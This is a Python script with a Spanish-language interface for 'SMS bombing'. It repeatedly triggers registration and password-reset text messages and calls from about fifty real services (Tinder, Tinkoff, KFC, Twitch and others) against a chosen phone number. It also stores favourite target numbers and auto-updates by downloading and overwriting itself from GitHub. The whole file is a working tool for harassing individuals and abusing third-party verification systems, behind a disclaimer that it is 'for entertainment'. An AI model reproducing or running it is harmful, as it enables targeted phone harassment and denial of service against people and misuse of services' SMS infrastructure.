import requests
import random, datetime, sys, time, argparse, os
from requests import post

version = 1.051
set = [1, 10]
fav_phones = []

if os.path.isfile("config.data") != 1:
	with open('config.data', 'w') as filehandle:  
 	   for listitem in set:
 	   	filehandle.write('%s\n' % listitem)

if os.path.isfile("config.data") == 1:
	set = []
	with open('config.data', 'r') as filehandle:
	 	for line in filehandle:
	 		currentPlace = line[:-1]
	 		set.append(float(currentPlace))

if os.path.isfile("phones.data") != 1:
	with open('phones.data', 'w') as filehandle:  
 	   for listitem in fav_phones:
 	   	filehandle.write('%s\n' % listitem)

if os.path.isfile("phones.data") == 1:
	with open('phones.data', 'r') as filehandle:
	 	for line in filehandle:
	 		currentPlace = line[:-1]
	 		fav_phones.append(currentPlace)

def return_phones():
	global fav_phones, _phone
	print(banner)
	for i in range(int(len(fav_phones)/2)):
		print(str(i) +" - "+fav_phones[i*2] + " " + fav_phones[i*2+1])
	_phone = fav_phones[int(input("\n"))*2]
	
def save_phones():
	global fav_phones
	while True:
		print(banner)
		for i in range(int(len(fav_phones)/2)):
			print(str(i) +" - "+fav_phones[i*2] + " " + fav_phones[i*2+1])
		print("\n1 - Añade un numero\n2 - Eliminar un numero\n0 - Desconectarse")
		_menu = input()
		if _menu == "0": break
		if _menu == "1":
			fav_phones.append(input("Ingresar numero: "))
			fav_phones.append(input("Ingrese una etiqueta para el numero: "))
		if _menu == "2":
	 		delete_phones = int(input("Ingrese el numero que desea eliminar: "))
	 		fav_phones.pop(delete_phones*2)
	 		fav_phones.pop(delete_phones*2)
		with open('phones.data', 'w') as filehandle:
			for listitem in fav_phones:
				filehandle.write('%s\n' % listitem)

def update():
	global version
	print("Comprobando actualizaciones")
	try:
		upd=requests.get('https://raw.githubusercontent.com/MaksPV/AresBomb/master/last_version.txt')
		upd_vers = float(upd.text[0:6])
		if upd_vers > version:
			print("actualizacion encontrada\n" + upd.text[0:6] + "\nCambios:\n" + upd.text[7:])
			print("\nActualizacion iniciada")
			upd_boom=requests.get('https://raw.githubusercontent.com/MaksPV/AresBomb/master/boom.py')
			f = open("boom.py", "wb")
			f.write(upd_boom.content)
			f.close()
			print("\nActualizacion completada, vuelve a abrir el script\npython boom.py")
			return "exit"
		elif upd_vers == version: print("La ultima version esta instalada")
		elif upd_vers < version: print("Desea unirte al equipo?")
		else: print("Error no se encuentra el archivo de actualizacion")
	except BaseException:
		print("No hay internet, intente mas tarde")

def send_sms(serv):
	global _phone, _phone9, _phone9dostavista, _phoneOstin, _phonePizzahut, _phoneGorzdrav, _name, password, username, email, _email
	if serv == 0: post('https://p.grabtaxi.com/api/passenger/v2/profiles/register', data={'phoneNumber': _phone,'countryCode': 'ID','name': 'test','email': 'mail@mail.com','deviceToken': '*'}, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36'})
	elif serv == 1: post('https://moscow.rutaxi.ru/ajax_keycode.html', data={'l': _phone9}).json()["res"]
	elif serv == 2: post('https://belkacar.ru/get-confirmation-code', data={'phone': _phone}, headers={})
	elif serv == 3: post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru', data={'phone_number': _phone}, headers={})
	elif serv == 4: post('https://app.karusel.ru/api/v1/phone/', data={'phone': _phone}, headers={})
	elif serv == 5: post('https://api.tinkoff.ru/v1/sign_up', data={'phone': '+'+_phone}, headers={})
	elif serv == 6: post('https://api.mtstv.ru/v1/users', json={'msisdn': _phone}, headers={})
	elif serv == 7: post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone})
	elif serv == 8: post('https://pizzahut.ru/account/password-reset', data={'reset_by':'phone', 'action_id':'pass-recovery', 'phone': _phonePizzahut, '_token':'*'})
	elif serv == 9: post('https://www.rabota.ru/remind', data={'credential': _phone})
	elif serv == 10: post('https://rutube.ru/api/accounts/sendpass/phone', data={'phone': '+'+_phone})
	elif serv == 11: post('https://www.citilink.ru/registration/confirm/phone/+'+_phone+'/')
	elif serv == 12: post('https://www.smsint.ru/bitrix/templates/sms_intel/include/ajaxRegistrationTrigger.php', data={'name': _name,'phone': _phone, 'promo': 'yellowforma'})
	elif serv == 13: post('https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCodeForOtp', params={'pageName': 'loginByUserPhoneVerification', 'fromCheckout': 'false','fromRegisterPage': 'true','snLogin': '','bpg': '','snProviderId': ''}, data={'phone': _phone,'g-recaptcha-response': '','recaptcha': 'on'})
	elif serv == 14: requests.get('https://www.oyorooms.com/api/pwa/generateotp?phone='+_phone9+'&country_code=%2B7&nod=4&locale=en')
	elif serv == 15: post('https://newnext.ru/graphql', json={'operationName': 'registration', 'variables': {'client': {'firstName': 'Иван', 'lastName': 'Иванов', 'phone': _phone,'typeKeys': ['Unemployed']}},'query': 'mutation registration($client: ClientInput!) {''\n  registration(client: $client) {''\n    token\n    __typename\n  }\n}\n'})
	elif serv == 16: post('https://api.sunlight.net/v3/customers/authorization/', data={'phone': _phone})
	elif serv == 17: post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/', json={'client_type': 'personal', 'email': _email, 'mobile_phone': _phone, 'deliveryOption': 'sms'})
	elif serv == 18: post('https://lk.invitro.ru/lk2/lka/patient/refreshCode', data={'phone': _phone})
	elif serv == 19: post('https://online.sbis.ru/reg/service/', json={'jsonrpc':'2.0','protocol':'5','method':'Пользователь.ЗаявкаНаФизика','params':{'phone':_phone},'id':'1'})
	elif serv == 20: post('https://ib.psbank.ru/api/authentication/extendedClientAuthRequest', json={'firstName':'Иван','middleName':'Иванович','lastName':'Иванов','sex':'1','birthDate':'10.10.2000','mobilePhone': _phone9,'russianFederationResident':'true','isDSA':'false','personalDataProcessingAgreement':'true','bKIRequestAgreement':'null','promotionAgreement':'true'})
	elif serv == 21: post('https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru', data={'phone': _phone})
	elif serv == 22: post('https://app.karusel.ru/api/v1/phone/', data={'phone': _phone})
	elif serv == 23: post('https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms', json={'phone': '+' + _phone})
	elif serv == 24: post("https://api.carsmile.com/",json={"operationName": "enterPhone", "variables": {"phone": _phone},"query": "mutation enterPhone($phone: String!) {\n  enterPhone(phone: $phone)\n}\n"})
	elif serv == 25: post('https://www.citilink.ru/registration/confirm/phone/+' + _phone + '/')
	elif serv == 26: post("https://api.delitime.ru/api/v2/signup",data={"SignupForm[username]": _phone, "SignupForm[device_type]": 3})
	elif serv == 27: post('https://www.delivery-club.ru/ajax/user_otp', data={"phone": _phone})
	elif serv == 28: post("https://guru.taxi/api/v1/driver/session/verify",json={"phone": {"code": 1, "number": _phone}})
	elif serv == 29: post('https://www.icq.com/smsreg/requestPhoneValidation.php',data={'msisdn': _phone, "locale": 'en', 'countryCode': 'ru','version': '1', "k": "ic1rtwz1s1Hj1O0r", "r": "46763"})
	elif serv == 30: post("https://terra-1.indriverapp.com/api/authorization?locale=ru",data={"mode": "request", "phone": "+" + _phone,"phone_permission": "unknown", "stream_id": 0, "v": 3, "appversion": "3.20.6","osversion": "unknown", "devicemodel": "unknown"})
	elif serv == 31: post("https://lk.invitro.ru/sp/mobileApi/createUserByPassword", data={"password": password, "application": "lkp", "login": "+" + _phone})
	elif serv == 32: post('https://ube.pmsm.org.ru/esb/iqos-phone/validate',json={"phone": _phone})
	elif serv == 33: post("https://api.ivi.ru/mobileapi/user/register/phone/v6",data={"phone": _phone})
	elif serv == 34: post('https://lenta.com/api/v1/authentication/requestValidationCode',json={'phone': '+' + self.formatted_phone})
	elif serv == 35: post('https://cloud.mail.ru/api/v2/notify/applink',json={"phone": "+" + _phone, "api": 2, "email": "email","x-email": "x-email"})
	elif serv == 36: post('https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCode',params={"pageName": "registerPrivateUserPhoneVerificatio"},data={"phone": _phone, "recaptcha": 'off', "g-recaptcha-response": ""})
	elif serv == 37: post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",data={"st.r.phone": "+" + _phone})
	elif serv == 38: post('https://plink.tech/register/',json={"phone": _phone})
	elif serv == 39: post("https://qlean.ru/clients-api/v2/sms_codes/auth/request_code",json={"phone": _phone})
	elif serv == 40: post("http://smsgorod.ru/sendsms.php",data={"number": _phone})
	elif serv == 41: post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru',data={'phone_number': _phone})
	elif serv == 42: post('https://passport.twitch.tv/register?trusted_request=true',json={"birthday": {"day": 11, "month": 11, "year": 1999},"client_id": "kd1unb4b3q4t58fwlpcbzcbnm76a8fp", "include_verification_code": True,"password": password, "phone_number": _phone,"username": username})
	elif serv == 43: post('https://cabinet.wi-fi.ru/api/auth/by-sms', data={'msisdn': _phone},headers={'App-ID': 'cabinet'})
	elif serv == 44: post("https://api.wowworks.ru/v2/site/send-code",json={"phone": _phone, "type": 2})
	elif serv == 45: post('https://eda.yandex/api/v1/user/request_authentication_code',json={"phone_number": "+" + _phone})
	elif serv == 46: post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone})
	elif serv == 47: post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/',json={"client_type": "personal", "email": f"{email}@gmail.ru","mobile_phone": _phone, "deliveryOption": "sms"})
	elif serv == 48: post("https://api-prime.anytime.global/api/v2/auth/sendVerificationCode",data={"phone": _phone})
	elif serv == 49: post('https://b.utair.ru/api/v1/login/', data = {'login': _phone, }, headers = {'Accept-Language':'en-US,en;q=0.5', 'Connection':'keep-alive', 'Host':'b.utair.ru', 'origin':'https://www.utair.ru','Referer':'https://www.utair.ru/'})
	else: print("Error de servicio")

def send_call(serv):
	global _phone, _phone9, _phone9dostavista, _phoneOstin, _phonePizzahut, _phoneGorzdrav, _name, password, username, email, _email
	if serv == 0: requests.get('https://findclone.ru/register', params={'phone': '+' + _phone})
	else: print("Error de servicio")

def bomb():
	global set, _phone, _phone9, _phone9dostavista, _phoneOstin, _phonePizzahut, _phoneGorzdrav, _name, password, username, email, _email
	_count_finish = 0
	print(banner)
	_phone = input('Insertar numero de celular ( Sin + 54xxxxxxxxxxxxx)\n1 - Ingrese su numero\n')
	if _phone == "1": return_phones()
	try:
		_count = int(input('Cantidad: (Recomendado: 100)'))
	except:
		_count = 100
		
	try:
		_timer = float(input('Delay entre mensajes: (Recomendado 0 segundos) '))
	except:
		_timer = 0
		
	if _phone[0] == '+': _phone = _phone[1:]
	if _phone[0] == '8': _phone = '7'+_phone[1:]
	if _phone[0] == '9': _phone = '7'+_phone
		
	_name = ''
	for x in range(12):
		_name = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
		password = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
		username = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
		
	_phone9 = _phone[1:]
	_phoneAresBank = '+'+_phone[0]+'('+_phone[1:4]+')'+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11]
	_phone9dostavista = _phone9[:3]+'+'+_phone9[3:6]+'-'+_phone9[6:8]+'-'+_phone9[8:10]
	_phoneOstin = '+'+_phone[0]+'+('+_phone[1:4]+')'+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11]
	_phonePizzahut = '+'+_phone[0]+' ('+_phone[1:4]+') '+_phone[4:7]+' '+_phone[7:9]+' '+_phone[9:11]
	_phoneGorzdrav = _phone[1:4]+') '+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11]
		
	_email = _name+'@gmail.com'
	email = _name+'@gmail.com'
	
	def screen():
		print(banner)
		print("\nPara detener Ctrl+Z\n")
		print('Habitacion: '+ _phone+ '\nSuerte ' + str(_count_finish) + ' de ' + str(_count))
	
	while _count_finish != _count:
		randsh = random.randint(1,100)
		if set[1] > randsh:
			_service_call = random.randint(0,0)
			try:
				send_call(_service_call)
				screen()
				print("Servicio de llamada " + str(_service_call) + " expedido")
				_count_finish += 1
			except:
				screen()
				print("!!! Llamada de servicio " + str(_service_call) + " No se envia")
		else:
			_service_sms = random.randint(0, 48)
			try:
				send_sms(_service_sms)
				screen()
				print("Servicio de sms " + str(_service_sms) + " expedido")
				_count_finish += 1
			except:
				screen()
				print("!!! Servicio de SMS " + str(_service_sms) + " No se envia")
		time.sleep(_timer)
	print(banner+'\nResultado:\n\nSuerte ' + str(_count_finish) + ' de ' + str(_count))
	if set[0] == 1.0: exit()
	else: input("Se completo el bombarder presione ENTER para menu")

def settings():
	global set
	while True:
		print(banner)
		print("\n1 - Salir del programa: " + str(set[0]))
		print("2 - Bombardeo de llamadas: " + str(set[1])+"%")
		print("\n0 - Salir del menu")
		menu = input()
		if menu == "0":
			with open('config.data', 'w') as filehandle:  
 			   for listitem in set:
 	  		 	filehandle.write('%s\n' % listitem)
			break
		elif menu == "1":
			if set[0] == 1: set[0] = 0
			elif set[0] == 0: set[0] = 1
		elif menu == "2":
			print(banner)
			set[1] = float(input("\nLlamadas: "))

def info():
	global banner, version
	print(banner+"\nVersion "+str(version)+"\n\nEl bombardero está diseñado solo para fines de entretenimiento. Para todas las acciones que pasa con él, solo usted es responsable \ n \ nBombardero original: https://github.com/FSystem88/spymer\n\n")
	input()

if update() == "exit": exit()
time.sleep(1)

while True:
	banner = ("\n" * 100)+ """
Disclaimer: Gracias por utilizar mi script, espero sea 
de su agrado, dicho esto.

No me responsabilizo de su mal uso.

EL CONOCIMIENTO ES LIBRE


 Creador: El-Ezze                          
	"""
	print(banner)
	menu = input("1 - Comienza a bombardear\n2 - Configuracion de bombardero\n3 - Numeros favoritos\n4 - Informe de bombardeo\n\n0 - Salir\n")
	if menu == "0": exit()
	if menu == "1": bomb()
	if menu == "2": settings()
	if menu == "3": save_phones()
	if menu == "4": info()
